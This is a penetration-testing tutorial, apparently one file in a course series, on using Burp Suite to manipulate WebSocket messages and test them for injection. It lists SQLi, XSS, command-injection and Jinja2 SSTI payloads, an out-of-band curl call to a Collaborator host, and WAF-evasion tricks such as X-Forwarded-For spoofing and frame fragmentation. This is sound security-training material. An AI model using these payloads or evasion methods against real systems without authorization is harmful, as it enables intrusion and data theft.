# WebSocket Message Manipulation and Injection Testing

## Purpose of This File

This file covers the practical Burp workflow for intercepting, replaying, and fuzzing WebSocket messages, then walks through how classic injection vulnerabilities (SQLi, XSS, command injection, SSTI) manifest when delivered through a WebSocket JSON payload instead of an HTTP body. Read `01-websocket-protocol-fundamentals.md` first if you haven't — this file assumes you understand handshakes, frames, and the WebSockets history tab.

---

## 1. Core Principle: WebSocket Delivery Does Not Change the Vulnerability Class

This is the single most important mental model for this file: **SQL injection is SQL injection, XSS is XSS, command injection is command injection — regardless of whether the tainted input arrived via a URL parameter, a POST body, or a WebSocket text frame.**

The vulnerability exists at the point where the server (or another client's browser) processes untrusted input unsafely. WebSocket delivery does not add any inherent sanitization, encoding, or validation. If anything, WebSocket-delivered input is *more* likely to be under-tested, because:

- Automated scanners historically have weaker WebSocket support than HTTP support, so these code paths get less coverage.
- Developers sometimes reason (incorrectly) that because the connection is "not a normal web request," the standard input validation middleware doesn't need to apply to it — and in poorly architected apps, it genuinely doesn't, because WebSocket message handlers are wired up as a separate code path from HTTP route handlers, bypassing centralized sanitization that was only ever attached to the HTTP request pipeline.
- Real-time features (chat, live dashboards) often prioritize low latency over rigorous validation.

**Real-world note:** In several real-world bug bounty writeups, WebSocket-delivered XSS and SQLi were found in features whose equivalent HTTP-based endpoints were already hardened — because the WebSocket handler was newer code, or literally a different code path that the security review never covered. Always ask: "does this app have an HTTP equivalent of this action, and was that one tested/fixed while this one wasn't?"

---

## 2. Burp Workflow: Intercepting and Modifying Messages

1. Open Burp's built-in browser (or configure your own browser to proxy through Burp) and navigate to the WebSocket-driven feature.
2. Confirm traffic is appearing in **Proxy > WebSockets history**.
3. In **Proxy > Intercept**, ensure interception is on. By default Burp intercepts both directions; you can restrict to client→server only via **Settings > Tools > Proxy > WebSocket interception rules** if server pushes are too noisy to review one-by-one.
4. Trigger the action in the browser (e.g., send a chat message). The outgoing frame appears in the Intercept tab.
5. Edit the raw message body directly in the Intercept tab, then click **Forward**.

This is useful for one-off tests, but for anything iterative (which is almost everything) you want Repeater instead.

---

## 3. Burp Workflow: Replaying Messages via Repeater

1. In **Proxy > WebSockets history**, right-click a captured message → **Send to Repeater**.
2. The Repeater tab opens with a WebSocket-aware interface: you can edit the message content and choose the direction to send it (to server or to client — useful for testing client-side handling of malicious server-pushed data, e.g., stored XSS reflected back to your own session).
3. Click **Send** repeatedly with different payloads — the underlying connection stays open, so each send is a genuinely new message over the same authenticated session, exactly like using Repeater against an HTTP endpoint.
4. The **History** panel within this Repeater tab logs every message sent over that connection (yours and the app's), letting you review sequencing — important for stateful protocols where message order matters (e.g., a "READY" handshake message expected before the server starts streaming, as seen in some chat implementations).
5. If the connection drops (common after a malformed frame crashes the handler, or after a rate-limit/ban), click the pencil icon next to the WebSocket URL at the top of the Repeater tab. This opens a wizard to **attach to an existing connection, clone a connected WebSocket, or reconnect** — letting you re-establish the handshake (with a refreshed token or spoofed header if needed) without leaving Repeater.

**Real-world note:** The "clone a connected WebSocket" option is particularly useful when a handshake requires a token that's only issued once per page load — clone an active session's handshake, then modify individual headers before reconnecting, rather than trying to manually reconstruct the full handshake from scratch.

---

## 4. Burp Workflow: Fuzzing Message Content

Burp Intruder does not have first-class WebSocket support in the way it does for HTTP, so the standard workflow is:

1. Send a captured WebSocket message to **Repeater**.
2. Manually iterate a small, high-signal payload set through Repeater (fastest for confirming a specific vulnerability class once you have a hypothesis).
3. For broader automated fuzzing, use **Burp Intruder against the underlying frame** where the WebSocket message is sent as a raw payload through a script, or — more commonly in practice — use a lightweight external script (Python + `websocket-client` library) that replays the JSON message structure with a wordlist injected into the target field, since this gives you full control over message framing, timing, and multi-step handshake sequences (e.g., send "READY" first, then the fuzzed payload) that Burp's native tooling doesn't automate for WebSockets.
4. Cross-reference any blind/out-of-band findings with Burp Collaborator exactly as you would for HTTP-based blind SQLi/SSRF/command injection — generate a Collaborator payload, embed it in the WebSocket message field, send, then poll Collaborator for interactions.

**Piece-by-piece: a minimal external fuzzing script structure (Python, conceptual)**

```python
import websocket
import json

ws = websocket.create_connection("wss://target.com/chat",
    header=["Cookie: session=abc123"])  # same session context as the handshake
ws.send('{"message":"READY"}')          # some apps require an init message first
for payload in payload_list:
    msg = json.dumps({"message": payload})
    ws.send(msg)
    result = ws.recv()
    # inspect result for reflected payload, error strings, timing, etc.
```

- `header=["Cookie: ..."]` — reproduces the session context that would normally be attached automatically by the browser during the handshake; without this the connection authenticates as anonymous (or fails), which is itself worth testing (see `03-authentication-and-authorization-testing.md`).
- The `"READY"` message models applications where the WebSocket protocol has its own internal state machine — sending the fuzzed payload before the server expects it may get silently dropped or the connection closed, producing false negatives. Always capture and replicate the legitimate message sequence first before fuzzing.
- `ws.recv()` is blocking and single-message; for apps that push multiple unsolicited messages, you need a receive loop or a short timeout window to capture all responses tied to one fuzzed input, since server pushes aren't guaranteed to arrive in a strict 1:1 pattern with what you sent (see Full-Duplex Model in file 01).

---

## 5. SQL Injection via WebSocket JSON Payloads

**Scenario:** A live search-as-you-type feature sends `{"query":"searchterm"}` over WebSocket, server responds with matching results.

**Payload:**
```json
{"query":"test' UNION SELECT username,password FROM users--"}
```

**Why it works:** Identical mechanism to HTTP-delivered SQLi — the server takes the `query` field and concatenates it into a SQL statement without parameterization. The WebSocket transport layer has no bearing on how the backend constructs its query. If the backend code path handling this WebSocket message reuses the same (vulnerable) query-building function as an HTTP endpoint, you'll get identical behavior; if it's a separate, newer code path, test independently — don't assume a fix on the HTTP side propagated here.

**Blind/time-based confirmation over WebSocket:**
```json
{"query":"test' AND (SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE pg_sleep(0) END)--"}
```
Measure the delay between sending the frame and receiving the corresponding response frame in Repeater's timeline. Because the connection is full-duplex, make sure you're timing against the *correct* response — if the app pushes unrelated messages on the same connection, a time-based measurement can be muddied by unrelated traffic arriving in between. Isolate by testing during low app activity, or by including a unique marker in your query results that you can positively match to your injected request.

**Out-of-band confirmation:** identical Collaborator-based technique as HTTP SQLi — embed a Collaborator subdomain in an OOB-capable payload (e.g., via `xp_dirtree`, `UTL_HTTP`, or DNS-exfil functions depending on DB engine), poll for interaction.

---

## 6. XSS via WebSocket JSON Payloads

**Scenario:** Chat app sends `{"message":"Hello"}`, server relays it to other connected clients' browsers, which render it as `<td>Hello</td>` in the chat window.

**Payload:**
```json
{"message":"<img src=1 onerror='alert(document.cookie)'>"}
```

**Why it works:** This is a stored/relayed XSS — the server acts purely as a message broker, and the vulnerable point is the *receiving* browser's DOM rendering, not the server's processing. The WebSocket delivery channel doesn't sanitize or encode the payload in transit; whatever HTML/JS-sanitization would normally happen on the render side needs to happen regardless of transport.

**Filter bypass consideration:** if the app has message-content filtering (e.g., blocking `<script>` tags, or filtering specific keywords), test standard XSS filter-bypass techniques — alternate tags/attributes, case variation, encoding — exactly as you would against an HTTP-delivered XSS filter. If the WebSocket connection is **terminated** after a blocked payload (a defense pattern some apps implement), that's a signal the app is running message-level filtering; test whether reconnecting resets any rate-limit/ban state, and whether the filter is consistent across the initial handshake and every subsequent message, or only applied to the first message after connection.

**Real-world note:** PortSwigger's own message-manipulation lab uses exactly this chat-XSS pattern, and adds a wrinkle: a WAF-style filter that blocks the payload *and* IP-bans the connection, requiring `X-Forwarded-For` spoofing on the handshake to reconnect — see `03-authentication-and-authorization-testing.md` and the WAF/Gateway section in this file for the underlying bypass logic.

---

## 7. Command Injection via WebSocket JSON Payloads

**Scenario:** A WebSocket-driven admin/diagnostic feature accepts `{"host":"8.8.8.8"}` and runs a ping against it server-side, streaming output back over the same connection.

**Payload:**
```json
{"host":"8.8.8.8; cat /etc/passwd"}
```
or, depending on how the value reaches the shell:
```json
{"host":"8.8.8.8 && whoami"}
```
```json
{"host":"$(whoami)"}
```

**Why it works:** Identical root cause to HTTP-delivered OS command injection — user input is concatenated into a shell command without proper escaping or the use of a safe subprocess API. WebSocket-streamed diagnostic/admin tools are a common real-world location for this class of bug because they're often built quickly for internal use and receive less security scrutiny than customer-facing HTTP endpoints, while still being reachable if the WebSocket endpoint isn't properly access-controlled (cross-reference `03-authentication-and-authorization-testing.md` for BFLA testing on exactly this kind of admin feature).

**Blind confirmation:** use time-delay (`; sleep 5`) or out-of-band (`; curl http://your-collaborator-payload.oastify.com`) exactly as with HTTP command injection, watching the WebSocket response frame timing or Collaborator interactions respectively.

---

## 8. SSTI via WebSocket JSON Payloads

**Scenario:** A WebSocket-driven notification/templating feature accepts `{"template":"Hello {{name}}"}` and server-side renders it with a template engine before broadcasting.

**Payload (Jinja2 example):**
```json
{"template":"{{7*7}}"}
```
If the response reflects `49`, the engine is evaluating the expression server-side — confirmed SSTI. Escalate exactly as you would in HTTP-delivered SSTI:
```json
{"template":"{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}"}
```

**Why it works:** Same underlying flaw as HTTP-delivered SSTI — untrusted input reaches a template engine's render function. The engine has no awareness of, or special handling for, the fact that the string arrived via WebSocket rather than a form field.

**WAF-bypass overlap:** if a WAF is present, standard SSTI WAF-bypass techniques (alternate delimiter syntax, string concatenation to avoid blocked substrings, engine-specific quirks) apply identically; see the WAF/API Gateway section below for how detection differs (or doesn't) at the WebSocket layer.

---

## 9. WAF / API Gateway Considerations for Message-Level Injection

**Relevance:** High. Unlike origin validation (covered in file 04), injection payloads delivered via WebSocket messages are exactly the kind of attack surface WAFs and API gateways attempt to inspect — so this section is directly applicable here.

**How WAFs typically detect this pattern:**
- **Deep packet inspection of frame payloads.** A WAF sitting in front of (or as part of) the WebSocket-terminating server can inspect the text content of each frame using the same signature/regex-based rules it applies to HTTP bodies (SQL keywords, script tags, shell metacharacters, template delimiters like `{{ }}` or `${ }`).
- **Connection termination on match.** A common pattern (and one demonstrated directly in PortSwigger's handshake-manipulation lab) is that a single detected malicious frame causes the WAF/gateway to immediately close the WebSocket connection and often ban the originating IP or session for a period, rather than just dropping/rejecting the individual message the way an HTTP WAF might return a 403 and allow the next request.
- **Stateful session flagging.** Because a WebSocket connection is long-lived, some gateways track a "violation score" across the life of the connection — one suspicious frame gets a warning, repeated attempts trigger a hard ban — which is different from stateless per-request HTTP WAF rules.

**Realistic bypass considerations:**
- **Encoding/obfuscation of the payload** exactly as with HTTP WAF bypass: alternate casing, whitespace variation, comment insertion (SQL `/**/`), string concatenation (SSTI/JS), or Unicode normalization tricks — since many WebSocket-layer WAF rules are simple regex reused from the HTTP ruleset and share the same blind spots.
- **Reconnecting under a different apparent identity.** If a ban is IP-based, spoofing `X-Forwarded-For` (or another trusted-but-unvalidated header) on the handshake — not the message itself — can restore access, because the ban logic often keys off a header value trusted at connection time rather than re-verifying the true source per message.
- **Fragmenting the payload across multiple WebSocket frames** (using the FIN bit / continuation frames covered in file 01) can, on weakly implemented inspection layers, cause a WAF that only inspects individual frames — rather than reassembling the full logical message before inspecting it — to miss a payload split across two or more frames. Not all WAFs are vulnerable to this, but it's a realistic and low-effort technique worth trying against DPI-based filters that don't reassemble fragmented WebSocket messages before pattern matching.
- **Testing whether the WAF only inspects the first message after connection**, then goes idle for the rest of the connection lifetime — some implementations apply strict scrutiny to the handshake and initial message (since that's where most naive bot/scanner traffic is caught) but relax inspection for a connection once it's been open and "well-behaved" for some time or message count.

---

## Next File

`03-authentication-and-authorization-testing.md` — where auth tokens live in the handshake vs. the first message, and how to test BOLA/BFLA over a persistent WebSocket connection.
